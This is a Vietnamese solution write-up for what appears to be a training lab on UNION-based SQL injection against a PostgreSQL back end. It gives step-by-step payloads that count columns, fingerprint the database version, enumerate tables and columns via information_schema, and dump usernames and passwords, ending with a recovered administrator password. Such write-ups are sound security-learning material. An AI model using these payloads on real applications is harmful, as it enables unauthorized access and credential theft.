# Đầu bài cho biết:
- Ứng dụng có lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm.
- Kết quả truy vấn được trả về trong phản hồi của ứng dụng, cho phép sử dụng tấn công UNION.
- Ứng dụng có chức năng đăng nhập, và cơ sở dữ liệu chứa một bảng lưu trữ tên người dùng và mật khẩu.
- Hệ thống sử dụng cơ sở dữ liệu không phải Oracle.

# Yêu cầu:
- Xác định tên của bảng chứa thông tin người dùng và tên các cột của bảng đó.
- Truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng.
- Đăng nhập với tư cách người dùng administrator.

# Solution

- Dùng ` ORDER BY` để đếm số cột

`' ORDER BY 1--`

`' ORDER BY 2--`

`' ORDER BY 3--` => Lỗi

- Vậy là có 2 cột

- Xác định phiên bản

`' UNION SELECT version(), NULL-- `

(Từ cách dùng version như này thì xác định được là dung PostgreSQL)

- Sử dụng information_schema.tables để liệt kê tên tất cả các bảng

`' UNION SELECT table_name, NULL FROM information_schema.tables--`

(Kiếm information_schema.tables PostgreSQL trên mạng để tìm thì tìm đc tên cột là table_name)

- Kết quả trả về `users_dagdkt`, đây là tên bảng chứa thông tin người dùng

- Sử dụng `information_schema.columns` để liệt kê tên tất cả các cột trong bảng `users_dagdkt`

`' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_dagdkt'--`

(Tương tự như trên thì kiếm được bảng rồi thì kiếm tên cột)

- Kết quả trả về các tên cột: `password_vofxgd`, `username_yxxamz`, và `email`

- Sử dụng câu lệnh UNION để truy xuất tên người dùng và mật khẩu từ bảng `users_dagdkt`:

`'UNION SELECT username_yxxamz, password_vofxgd FROM users_dagdkt--`

- Kết quả nhận lại được:
administrator
0k75hb39t3qykxb1bftw
